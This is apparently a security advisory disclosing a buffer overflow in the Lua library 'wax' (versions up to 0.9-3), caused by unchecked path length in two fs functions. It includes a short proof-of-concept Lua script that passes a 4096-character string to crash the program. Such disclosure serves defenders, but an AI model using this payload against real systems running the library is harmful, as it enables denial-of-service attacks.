## The third-party Lua library "wax" has a buffer overflow vulnerability.

Affected product: wax <= 0.9-3

### Product Information

project: https://luarocks.org/modules/arkt8/wax

source code: https://codeberg.org/waxlab/wax

Wax is a Lua package, that aims to provide increasing support to the most common scripting tasks. Its name comes from the astronomical term used to describe a planetary body that looks to be "waxing" or "crescent" as its surface is revealed by its main star light.

### Vulnerability Description

buffer overflow in wax https://codeberg.org/waxlab/wax/src/branch/latest/src/fs/init.c

vuln function: `wax_fs_getcwdname`、`wax_fs_basename`

The length of arg1 was not verified, resulting in a buffer overflow when the length of arg1 is greater than PATH_MAX 4096.

![](/img/4.png)

### Verify

When users utilize this library for file operations, it may potentially lead to a buffer overflow vulnerability, thereby resulting in a denial-of-service condition in the program.

The following content is a typical case:

```lua
local fs = require("wax.fs")

local payload = string.rep("A",4096)
-- fs.basename(payload)
fs.dirname(payload)
```

![](/img/5.png)

